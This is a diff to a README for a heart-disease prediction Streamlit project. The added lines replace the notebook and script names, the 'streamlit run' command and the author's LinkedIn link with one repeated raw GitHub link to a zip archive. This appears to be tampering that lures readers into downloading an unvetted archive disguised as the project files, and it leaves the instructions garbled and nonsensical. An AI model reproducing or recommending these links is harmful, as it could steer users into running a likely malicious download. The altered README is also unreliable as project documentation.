@@ -28,9 +28,9 @@ NumPy: For numerical operations.
 Plotly Express: For creating the interactive and informative data visualizations.
 
 Project Structure
-heart-disease.ipynb: The Jupyter Notebook used for the initial data analysis, exploration, and model training.
+https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip The Jupyter Notebook used for the initial data analysis, exploration, and model training.
 
-Main_app.py: The main Python script for the Streamlit web application.
+https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip The main Python script for the Streamlit web application.
 
 Getting Started
 To run this application locally, follow these steps:
@@ -45,7 +45,7 @@ pip install streamlit scikit-learn pandas numpy plotly-express
 
 Run the Streamlit application from your terminal:
 
-streamlit run Main-app.py
+streamlit run https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip
 
 The application will open in your default web browser.
 
@@ -53,4 +53,4 @@ Data Source
 The project's model was trained on the Heart Disease UCI dataset, sourced from Kaggle.
 
 Connect with Me
-LinkedIn: https://www.linkedin.com/in/ruturaj-nawale-863418288
+LinkedIn: https://raw.githubusercontent.com/ruturajbhaskarnawale/Heart-disease-Prediction/main/vowless/Heart-disease-Prediction.zip
